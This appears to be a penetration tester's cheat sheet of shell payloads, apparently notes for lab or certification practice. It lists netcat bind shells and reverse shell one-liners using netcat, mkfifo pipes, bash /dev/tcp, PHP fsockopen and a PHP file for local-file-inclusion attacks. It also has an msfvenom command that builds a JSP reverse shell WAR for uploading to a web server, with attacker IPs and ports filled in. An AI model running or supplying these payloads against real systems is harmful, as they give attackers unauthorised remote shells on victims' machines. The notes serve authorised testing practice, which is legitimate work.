...
### BIND SHELL (backdoor):
    on victim:  nc -lvp 4444 -e /bin/sh
        Windows:  nc -nlvp 4444 -e cmd.exe
    on attacker:  nc 1.2.3.4 4444
### REVERSE SHELL (callback):
    ...
    PAYLOADS (on Victim):
        NETCAT:
            nc [Attack box IP] 4444 -e /bin/sh  \\  nc [Attack box IP] 4444 -c bash  \\  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 4444 >/tmp/f
            Windows:  nc.exe [Attack box IP] 4444 -e cmd.exe
        BASH:
            bash -i >& /dev/tcp/[Attack box IP]/4444 0>&1  \\  bash -c "bash -i >& /dev/tcp/10.10.14.217/4445 0>&1"  \\  setsid bash -i &>/dev/tcp/10.10.14.20/4444 0>&1 &
        PERL:
        ...
        PHP:
            Best:  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
            Commandline:  php -r '$sock=fsockopen("192.168.119.186",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
                Simple Content Inject:  $sock=fsockopen("10.10.14.11", 4445);exec("/bin/sh -i <&3 >&3 2>&3");
                Advanced Content Inject:  http://pentestmonkey.net/tools/web-shells/php-reverse-shell
            ...
            LFI PHP SHELL:
            <?php
            system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.186 4444 >/tmp/f');
            ?>
                Access in browser with /file, not /file.php?
    ...
    WAR file (for uploading to web server; ex. .jsp):
        msfvenom -p java/jsp_shell_reverse_tcp LHOST=[Attack box IP] LPORT=4444 -f war > /root/Desktop/shell.war
